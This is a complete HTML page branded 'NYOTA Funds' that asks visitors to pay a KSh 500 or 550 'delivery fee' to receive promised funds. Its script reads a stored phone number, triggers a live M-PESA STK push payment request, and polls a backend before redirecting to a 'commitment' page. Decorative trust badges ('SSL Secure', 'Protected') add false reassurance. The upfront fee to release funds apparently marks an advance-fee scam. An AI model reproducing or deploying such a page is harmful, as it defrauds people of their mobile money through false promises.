<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#087f32">
<title>NYOTA Funds - Delivery</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}

body{
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
overflow-x:hidden;
background:
radial-gradient(circle at 15% 20%,rgba(34,197,94,.35),transparent 30%),
radial-gradient(circle at 85% 80%,rgba(59,130,246,.35),transparent 30%),
linear-gradient(135deg,#064e3b,#1e40af);
color:white;
}

body::before,
body::after{
content:"";
position:fixed;
width:240px;
height:240px;
border-radius:50%;
filter:blur(90px);
z-index:-1;
animation:moveBlob 10s ease-in-out infinite alternate;
}

body::before{
background:#16a34a;
top:-70px;
left:-70px;
}

body::after{
background:#2563eb;
bottom:-70px;
right:-70px;
}

@keyframes moveBlob{
from{transform:translate(0,0)}
to{transform:translate(20px,-20px)}
}

.container{width:100%;max-width:470px}

.card{
background:rgba(255,255,255,.10);
backdrop-filter:blur(16px);
border:1px solid rgba(255,255,255,.15);
border-radius:24px;
padding:24px;
box-shadow:0 25px 70px rgba(0,0,0,.35);
}

/* Progress */

.progress{
display:flex;
align-items:center;
justify-content:center;
margin-bottom:22px;
}

.step{
width:34px;
height:34px;
border-radius:50%;
background:rgba(255,255,255,.15);
display:flex;
align-items:center;
justify-content:center;
font-weight:bold;
}

.step.active{background:#16a34a}

.line{
width:55px;
height:3px;
background:rgba(255,255,255,.2);
}

.line.active{background:#16a34a}

/* Heading */

.hero{
text-align:center;
font-size:55px;
margin-bottom:10px;
animation:float 3s ease-in-out infinite;
}

@keyframes float{
0%,100%{transform:translateY(0)}
50%{transform:translateY(-8px)}
}

h1{
text-align:center;
font-size:28px;
margin-bottom:8px;
}

.subtitle{
text-align:center;
color:rgba(255,255,255,.8);
line-height:1.5;
margin-bottom:22px;
}

/* Cards */

.delivery-option{
position:relative;
display:flex;
gap:12px;
align-items:flex-start;
padding:18px;
border-radius:16px;
border:2px solid rgba(255,255,255,.12);
background:rgba(255,255,255,.05);
margin-bottom:15px;
cursor:pointer;
transition:.3s ease;
}

.delivery-option:hover{
transform:translateY(-2px);
}

.delivery-option input{
margin-top:5px;
accent-color:#22c55e;
}

.delivery-option:has(input:checked){
border-color:#22c55e;
background:rgba(34,197,94,.18);
box-shadow:0 12px 28px rgba(34,197,94,.25);
}

.check{
position:absolute;
right:16px;
top:16px;
display:none;
font-weight:bold;
}

.delivery-option:has(input:checked) .check{
display:block;
}

.method{
font-weight:bold;
font-size:16px;
}

.fee{
margin-top:6px;
color:rgba(255,255,255,.75);
font-size:14px;
}

.fee small{
color:rgba(255,255,255,.55);
}

/* Amount */

.selected-fee{
margin:22px 0;
padding:18px;
border-radius:14px;
background:rgba(22,163,74,.12);
border:1px solid rgba(22,163,74,.3);
text-align:center;
}

.selected-fee strong{
display:inline-block;
font-size:24px;
transition:.25s;
}

.changed{
transform:scale(1.15);
}

/* Button */

button{
width:100%;
padding:17px;
border:none;
border-radius:14px;
background:linear-gradient(135deg,#16a34a,#087f32);
color:white;
font-size:17px;
font-weight:bold;
cursor:pointer;
position:relative;
overflow:hidden;
}

button::after{
content:"";
position:absolute;
top:0;
left:-120%;
width:100%;
height:100%;
background:linear-gradient(120deg,transparent,rgba(255,255,255,.35),transparent);
transition:.7s;
}

button:hover::after{
left:120%;
}

button:disabled{
opacity:.7;
cursor:not-allowed;
}

/* Spinner */

.spinner{
display:none;
width:24px;
height:24px;
border:3px solid rgba(255,255,255,.25);
border-top:3px solid white;
border-radius:50%;
animation:spin .8s linear infinite;
margin:14px auto;
}

@keyframes spin{
to{transform:rotate(360deg)}
}

/* Status */

#status{
min-height:24px;
margin-top:14px;
text-align:center;
padding:12px;
border-radius:10px;
}

.success{
background:rgba(34,197,94,.18);
color:#7ef0aa;
}

.error{
background:rgba(239,68,68,.18);
color:#ffb4b4;
}

/* Trust */

.trust{
display:flex;
justify-content:space-between;
margin-top:20px;
font-size:12px;
color:rgba(255,255,255,.75);
}

.footer{
text-align:center;
margin-top:18px;
color:rgba(255,255,255,.55);
font-size:12px;
}
</style>
</head>

<body>

<div class="container">

<div class="card">

<div class="progress">
<div class="step active">1</div>
<div class="line active"></div>
<div class="step active">2</div>
<div class="line"></div>
<div class="step">3</div>
</div>

<div class="hero">📲</div>

<h1>Funds Delivery</h1>

<p class="subtitle">
Kindly choose where you would like your funds transferred. Each delivery method has a small fee to cover processing and delivery charges.
</p>

<label class="delivery-option">
<input type="radio" name="delivery" value="500">
<div>
<div class="method">📱 Mobile Money</div>
<div class="fee">
KSh 500 delivery charge
<br><small>Funds arrive in 1–5 minutes</small>
</div>
</div>
<div class="check">✓</div>
</label>

<label class="delivery-option">
<input type="radio" name="delivery" value="550">
<div>
<div class="method">🏦 Bank Account</div>
<div class="fee">
KSh 550 delivery charge
<br><small>Within one business day</small>
</div>
</div>
<div class="check">✓</div>
</label>

<div class="selected-fee">
Delivery Fee
<br>
<strong>KSh <span id="deliveryFee">0</span></strong>
</div>

<button id="payButton">Pay Delivery Charges →</button>

<div class="spinner" id="spinner"></div>

<div id="status"></div>

<div class="trust">
<span>🔒 SSL Secure</span>
<span>⚡ M-PESA</span>
<span>✔ Protected</span>
</div>

</div>

<div class="footer">
Secure NYOTA Funds Delivery
</div>

</div>

<script>
"use strict";

/* PAYLOR LIVE BACKEND */
const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";

const deliveryFee=document.getElementById("deliveryFee");
const payButton=document.getElementById("payButton");
const statusElement=document.getElementById("status");
const spinner=document.getElementById("spinner");

document.querySelectorAll('input[name="delivery"]').forEach(input=>{
input.addEventListener("change",()=>{
deliveryFee.textContent=Number(input.value).toLocaleString("en-KE");
deliveryFee.parentElement.classList.add("changed");
setTimeout(()=>deliveryFee.parentElement.classList.remove("changed"),250);
});
});

function setStatus(message,type=""){
statusElement.textContent=message;
statusElement.className=type;
}

function setLoading(loading,text="Processing..."){
payButton.disabled=loading;
payButton.textContent=loading?text:"Pay Delivery Charges →";
spinner.style.display=loading?"block":"none";
}

function normalizePhone(phone){
phone=phone.replace(/[^\d+]/g,"");
if(phone.startsWith("+254")) phone=phone.slice(1);
if(phone.startsWith("07")||phone.startsWith("01")){
phone="254"+phone.slice(1);
}
return phone;
}

async function readJson(response){
const text=await response.text();
return text?JSON.parse(text):{};
}

async function payDelivery(){

const selected=document.querySelector('input[name="delivery"]:checked');

if(!selected){
setStatus("Please select a delivery method.","error");
return;
}

const savedPhone=
localStorage.getItem("phoneNumber")||
localStorage.getItem("phone");

if(!savedPhone){
setStatus("Phone number not found.","error");
return;
}

const phone=normalizePhone(savedPhone);
const amount=Number(selected.value);

localStorage.setItem(
"deliveryMethod",
amount===500?"Mobile Money":"Bank Account"
);

localStorage.setItem("deliveryFee",amount);

setLoading(true,"Sending STK Push...");
setStatus("Sending M-PESA payment request...");

try{

const response=await fetch(`${BACKEND_URL}/stk-push`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone,
amount
})
});

const data=await readJson(response);

if(!response.ok||data.success===false){
throw new Error(data.message||"STK Push failed.");
}

const transactionId=
data.transactionId||
data.data?.transactionId||
data.checkout_request_id||
data.data?.checkout_request_id;

setLoading(true,"Waiting for Payment...");
setStatus("STK Push sent. Enter your M-PESA PIN.");

await checkPayment(transactionId);

}catch(error){

setStatus(error.message,"error");
setLoading(false);

}

}

async function checkPayment(transactionId){

const started=Date.now();

while(Date.now()-started<120000){

try{

const response=await fetch(`${BACKEND_URL}/payment-status`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({transactionId})
});

const result=await readJson(response);

const status=String(result.data?.status||"").toUpperCase();

if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){

setStatus("Payment confirmed. Redirecting...","success");

setTimeout(()=>{
window.location.href="commitment.html";
},1000);

return;
}

if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
throw new Error("Payment "+status.toLowerCase()+".");
}

}catch(error){

if(/failed|cancelled|expired/i.test(error.message)){
setStatus(error.message,"error");
setLoading(false);
return;
}

}

await new Promise(r=>setTimeout(r,3000));

}

setStatus(
"Payment confirmation timed out. Check your M-PESA SMS.",
"error"
);

setLoading(false);

}

payButton.addEventListener("click",payDelivery);
</script>

</body>
</html>
